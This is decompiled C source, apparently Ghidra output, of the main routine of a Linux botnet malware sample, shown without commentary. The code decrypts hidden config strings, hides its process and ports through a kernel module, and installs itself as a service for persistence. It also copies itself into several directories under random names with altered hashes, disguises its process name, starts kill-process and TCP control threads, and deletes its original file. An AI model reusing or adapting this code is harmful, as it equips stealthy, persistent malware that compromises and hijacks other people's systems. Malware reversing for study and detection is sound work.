
/* WARNING: Restarted to delay deadcode elimination for space: stack */

void main(int param_1,char **param_2)

{
  char cVar1;
  ushort uVar2;
  __pid_t _Var3;
  time_t tVar4;
  int iVar5;
  char *pcVar6;
  long lVar7;
  uint uVar8;
  stat local_3db4;
  int local_3d5c;
  char local_3d55 [4096];
  char local_2d55 [4096];
  char local_1d55 [256];
  byte local_1c55 [256];
  byte local_1b55 [256];
  byte local_1a55 [256];
  byte local_1955 [256];
  byte local_1855 [256];
  byte local_1755 [256];
  byte local_1655 [256];
  byte local_1555 [256];
  undefined4 local_1455;
  undefined4 local_1451;
  undefined2 local_144d;
  undefined local_144b;
  char local_144a [1024];
  char local_104a [1024];
  char local_c4a [1024];
  undefined4 local_84a;
  undefined4 local_846;
  undefined2 local_842;
  char local_840 [1024];
  char local_440 [1024];
  pthread_t local_40;
  uint local_3c;
  int local_38;
  uint local_34;
  int local_30;
  void *local_2c;
  time_t local_28;
  int local_24;
  int local_20;
  key_t local_1c;
  int local_18;
  __pid_t *local_14;
  int *piStack_10;
  
  piStack_10 = &param_1;
  memset(local_440,0,0x400);
  memset(local_840,0,0x400);
  local_84a = 0;
  local_846 = 0;
  local_842 = 0;
  memset(local_c4a,0,0x400);
  memset(local_104a,0,0x400);
  memset(local_144a,0,0x400);
  local_1455 = 0;
  local_1451 = 0;
  local_144d = 0;
  local_144b = 0;
  memset(local_1555,0,0x100);
  memset(local_1655,0,0x100);
  memset(local_1755,0,0x100);
  memset(local_1855,0,0x100);
  memset(local_1955,0,0x100);
  memset(local_1a55,0,0x100);
  memset(local_1b55,0,0x100);
  memset(local_1c55,0,0x100);
  memset(local_1d55,0,0x100);
  memset(local_2d55,0,0x1000);
  memset(local_3d55,0,0x1000);
  local_2c = (void *)0x0;
  local_3d5c = 0;
  local_20 = 0;
  local_1c = -0x258e78ea;
  local_18 = 0xffffffff;
  local_14 = (__pid_t *)0x0;
  signal(0x16,(__sighandler_t)&_nl_current_LC_NUMERIC_used);
  signal(0x15,(__sighandler_t)&_nl_current_LC_NUMERIC_used);
  signal(0x14,(__sighandler_t)&_nl_current_LC_NUMERIC_used);
  signal(1,(__sighandler_t)&_nl_current_LC_NUMERIC_used);
  signal(0xd,(__sighandler_t)&_nl_current_LC_NUMERIC_used);
  signal(0x11,(__sighandler_t)&_nl_current_LC_NUMERIC_used);
  setenv("PATH","/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin",1);
  get_self(local_840,0x400);
  dec_conf(local_1555,"m7A4nQ_/nA",0xb);
  dec_conf(local_1655,"m [(n3",7);
  dec_conf(local_1755,"m6_6n3",7);
  dec_conf(local_1955,&DAT_080b306a,0x12);
  dec_conf(local_1a55,&DAT_080b307c,0x11);
  dec_conf(local_1b55,"m.[$n3",7);
  dec_conf(local_1c55,&DAT_080b3094,0x200);
  dec_conf(local_1855,"m4S4nAC/nA",0xb);
  for (local_3c = 0; local_3c < 0x17; local_3c = local_3c + 1) {
    encrypt_code(daemonname + local_3c * 0x14,0x14);
  }
  daemon(1,0);
  if (param_1 == 2) {
    local_38 = atoi(param_2[1]);
    local_18 = shmget(local_1c,0x40,0x780);
    if (local_18 == -1) {
      local_18 = shmget(local_1c,0x40,0x380);
      if (local_18 == -1) {
        return 0;
      }
      local_14 = (__pid_t *)shmat(local_18,(void *)0x0,0);
      if (local_14 == (__pid_t *)0xffffffff) {
        return 0;
      }
      *local_14 = 0;
      shmdt(local_14);
    }
    LinuxExec(*param_2);
    DelService_form_pid(local_38);
    return 0;
  }
  if (param_1 == 3) {
    _Var3 = getpid();
    HidePidPort(1,_Var3);
    local_2c = readfile(local_840,&local_3d5c);
    uVar8 = 0xffffffff;
    pcVar6 = param_2[1];
    do {
      if (uVar8 == 0) break;
      uVar8 = uVar8 - 1;
      cVar1 = *pcVar6;
      pcVar6 = pcVar6 + 1;
    } while (cVar1 != '\0');
    memmove(local_1d55,param_2[1],~uVar8 - 1);
    local_38 = atoi(param_2[2]);
    uVar8 = 0xffffffff;
    pcVar6 = *param_2;
    do {
      if (uVar8 == 0) break;
      uVar8 = uVar8 - 1;
      cVar1 = *pcVar6;
      pcVar6 = pcVar6 + 1;
    } while (cVar1 != '\0');
    uVar8 = ~uVar8;
    pcVar6 = *param_2;
    while (uVar8 = uVar8 - 1, uVar8 != 0) {
      *pcVar6 = '\0';
      pcVar6 = pcVar6 + 1;
    }
    uVar8 = 0xffffffff;
    pcVar6 = param_2[1];
    do {
      if (uVar8 == 0) break;
      uVar8 = uVar8 - 1;
      cVar1 = *pcVar6;
      pcVar6 = pcVar6 + 1;
    } while (cVar1 != '\0');
    uVar8 = ~uVar8;
    pcVar6 = param_2[1];
    while (uVar8 = uVar8 - 1, uVar8 != 0) {
      *pcVar6 = '\0';
      pcVar6 = pcVar6 + 1;
    }
    uVar8 = 0xffffffff;
    pcVar6 = param_2[2];
    do {
      if (uVar8 == 0) break;
      uVar8 = uVar8 - 1;
      cVar1 = *pcVar6;
      pcVar6 = pcVar6 + 1;
    } while (cVar1 != '\0');
    uVar8 = ~uVar8;
    pcVar6 = param_2[2];
    while (uVar8 = uVar8 - 1, uVar8 != 0) {
      *pcVar6 = '\0';
      pcVar6 = pcVar6 + 1;
    }
    strcpy(*param_2,local_1d55);
    snprintf(local_2d55,0x1000,"/proc/%d/exe",local_38);
    tVar4 = time((time_t *)0x0);
    local_24 = tVar4 + 5;
    while( true ) {
      local_28 = time((time_t *)0x0);
      if (local_24 < local_28) {
        _Var3 = getpid();
        HidePidPort(2,_Var3);
        remove(local_840);
        return 0;
      }
      local_34 = readlink(local_2d55,local_3d55,0xfff);
      if ((int)local_34 < 1) break;
      sleep(1);
    }
    DelService(local_3d55);
    CreateDir((char *)local_1555);
    CreateDir((char *)local_1655);
    CreateDir((char *)local_1755);
    randstr((int)&local_1455,10);
    snprintf(local_c4a,0x400,"%s%s",local_1555,&local_1455);
    snprintf(local_104a,0x400,"%s%s",local_1655,&local_1455);
    snprintf(local_144a,0x400,"%s%s",local_1755,&local_1455);
    iVar5 = stat((char *)local_1a55,&local_3db4);
    if (iVar5 == 0) {
      iVar5 = copyfile((char *)local_1a55,local_c4a);
      if (iVar5 == 0) {
        iVar5 = writefile(local_c4a,(int)local_2c,local_3d5c);
        if (iVar5 != 0) {
          randmd5(local_c4a);
          LinuxExec(local_c4a);
        }
      }
      else {
        randmd5(local_c4a);
        LinuxExec(local_c4a);
      }
      iVar5 = copyfile((char *)local_1a55,local_104a);
      if (iVar5 == 0) {
        iVar5 = writefile(local_104a,(int)local_2c,local_3d5c);
        if (iVar5 != 0) {
          randmd5(local_104a);
          LinuxExec(local_104a);
        }
      }
      else {
        randmd5(local_104a);
        LinuxExec(local_104a);
      }
      iVar5 = copyfile((char *)local_1a55,local_144a);
      if (iVar5 == 0) {
        iVar5 = writefile(local_144a,(int)local_2c,local_3d5c);
        if (iVar5 != 0) {
          randmd5(local_144a);
          LinuxExec(local_144a);
        }
      }
      else {
        randmd5(local_144a);
        LinuxExec(local_144a);
      }
    }
    else {
      iVar5 = writefile(local_c4a,(int)local_2c,local_3d5c);
      if (iVar5 == 0) {
        iVar5 = writefile(local_104a,(int)local_2c,local_3d5c);
        if (iVar5 == 0) {
          iVar5 = writefile(local_144a,(int)local_2c,local_3d5c);
          if (iVar5 != 0) {
            randmd5(local_144a);
            LinuxExec(local_144a);
          }
        }
        else {
          randmd5(local_104a);
          LinuxExec(local_104a);
        }
      }
      else {
        randmd5(local_c4a);
        LinuxExec(local_c4a);
      }
    }
    HidePidPort(2,local_38);
    _Var3 = getpid();
    HidePidPort(2,_Var3);
    remove(local_840);
    return 0;
  }
  pcVar6 = get_self_path(local_440,0x400);
  if ((((pcVar6 != (char *)0x0) && (iVar5 = strcmp(local_440,(char *)local_1555), iVar5 != 0)) &&
      (iVar5 = strcmp(local_440,(char *)local_1655), iVar5 != 0)) &&
     (iVar5 = strcmp(local_440,(char *)local_1755), iVar5 != 0)) {
    CreateDir((char *)local_1555);
    CreateDir((char *)local_1655);
    CreateDir((char *)local_1755);
    CreateDir((char *)local_1b55);
    CreateDir((char *)local_1855);
    randstr((int)&local_1455,10);
    snprintf(local_c4a,0x400,"%s%s",local_1555,&local_1455);
    snprintf(local_104a,0x400,"%s%s",local_1655,&local_1455);
    snprintf(local_144a,0x400,"%s%s",local_1755,&local_1455);
    get_self(local_840,0x400);
    copyfile(local_840,(char *)local_1a55);
    iVar5 = copyfile(local_840,local_c4a);
    if (iVar5 == 0) {
      iVar5 = copyfile(local_840,local_104a);
      if (iVar5 == 0) {
        iVar5 = copyfile(local_840,local_144a);
        if (iVar5 != 0) {
          randmd5(local_144a);
          LinuxExec(local_144a);
        }
      }
      else {
        randmd5(local_104a);
        LinuxExec(local_104a);
      }
    }
    else {
      randmd5(local_c4a);
      LinuxExec(local_c4a);
    }
    sleep(1);
    remove(local_840);
    return 0;
  }
  local_18 = shmget(local_1c,0x40,0x780);
  if (local_18 == -1) {
    local_18 = shmget(local_1c,0x40,0x380);
    if ((local_18 == -1) ||
       (local_14 = (__pid_t *)shmat(local_18,(void *)0x0,0), local_14 == (__pid_t *)0xffffffff))
    goto LAB_0804db7a;
    pcVar6 = get_file_form_pid(*local_14,local_3d55,0x1000);
    if (pcVar6 != (char *)0x0) {
      remove(local_840);
      return 0;
    }
  }
  else {
    local_14 = (__pid_t *)shmat(local_18,(void *)0x0,0);
    if (local_14 == (__pid_t *)0xffffffff) goto LAB_0804db7a;
  }
  _Var3 = getpid();
  *local_14 = _Var3;
  shmdt(local_14);
LAB_0804db7a:
  InstallSYS();
  AddService(local_840);
  local_30 = CheckLKM();
  if (local_30 == 0) {
    lchown(local_840,0xad1473b8,0xad1473b8);
  }
  uVar2 = randomid(0,0x17);
  local_34 = (uint)uVar2;
  uVar8 = 0xffffffff;
  pcVar6 = *param_2;
  do {
    if (uVar8 == 0) break;
    uVar8 = uVar8 - 1;
    cVar1 = *pcVar6;
    pcVar6 = pcVar6 + 1;
  } while (cVar1 != '\0');
  uVar8 = ~uVar8;
  pcVar6 = *param_2;
  while (uVar8 = uVar8 - 1, uVar8 != 0) {
    *pcVar6 = '\0';
    pcVar6 = pcVar6 + 1;
  }
  strcpy(*param_2,daemonname + local_34 * 0x14);
  decrypt_remotestr();
  for (local_20 = MainList._260_4_; local_20 != 0; local_20 = *(int *)(local_20 + 0x104)) {
    HidePidPort(3,(uint)*(ushort *)(local_20 + 0x100));
  }
  _Var3 = getpid();
  HidePidPort(1,_Var3);
  init_crc_table();
  lVar7 = sysconf(0x53);
  THREAD_NUM = lVar7 * 2;
  sem_init((sem_t *)sem,0,1);
  pthread_create(&local_40,(pthread_attr_t *)0x0,kill_process,(void *)0x0);
  pthread_create(&local_40,(pthread_attr_t *)0x0,tcp_thread,(void *)0x0);
  pthread_create(&local_40,(pthread_attr_t *)0x0,daemon_get_kill_process,local_1c55);
  do {
    CreateDir((char *)local_1555);
    CreateDir((char *)local_1655);
    CreateDir((char *)local_1755);
    randstr((int)&local_1455,10);
    snprintf(local_c4a,0x400,"%s%s",local_1555,&local_1455);
    snprintf(local_104a,0x400,"%s%s",local_1655,&local_1455);
    snprintf(local_144a,0x400,"%s%s",local_1755,&local_1455);
    iVar5 = copyfile((char *)local_1a55,local_c4a);
    if (iVar5 == 0) {
      iVar5 = copyfile((char *)local_1a55,local_104a);
      if (iVar5 == 0) {
        iVar5 = copyfile((char *)local_1a55,local_144a);
        if (iVar5 != 0) {
          if (local_30 == 0) {
            lchown(local_144a,0xad1473b8,0xad1473b8);
          }
          for (local_3c = 0; local_3c < 5; local_3c = local_3c + 1) {
            randmd5(local_144a);
            local_84a = 0;
            local_846 = 0;
            local_842 = 0;
            _Var3 = getpid();
            snprintf((char *)&local_84a,10,"%d",_Var3);
            uVar2 = randomid(0,0x17);
            local_34 = (uint)uVar2;
            LinuxExec_Argv2(local_144a,daemonname + local_34 * 0x14,&local_84a);
          }
        }
      }
      else {
        if (local_30 == 0) {
          lchown(local_104a,0xad1473b8,0xad1473b8);
        }
        for (local_3c = 0; local_3c < 5; local_3c = local_3c + 1) {
          randmd5(local_104a);
          local_84a = 0;
          local_846 = 0;
          local_842 = 0;
          _Var3 = getpid();
          snprintf((char *)&local_84a,10,"%d",_Var3);
          uVar2 = randomid(0,0x17);
          local_34 = (uint)uVar2;
          LinuxExec_Argv2(local_104a,daemonname + local_34 * 0x14,&local_84a);
        }
      }
    }
    else {
      if (local_30 == 0) {
        lchown(local_c4a,0xad1473b8,0xad1473b8);
      }
      for (local_3c = 0; local_3c < 5; local_3c = local_3c + 1) {
        randmd5(local_c4a);
        local_84a = 0;
        local_846 = 0;
        local_842 = 0;
        _Var3 = getpid();
        snprintf((char *)&local_84a,10,"%d",_Var3);
        uVar2 = randomid(0,0x17);
        local_34 = (uint)uVar2;
        LinuxExec_Argv2(local_c4a,daemonname + local_34 * 0x14,&local_84a);
      }
    }
    sleep(1);
    remove(local_c4a);
    remove(local_104a);
    remove(local_144a);
    sleep(4);
  } while( true );
}


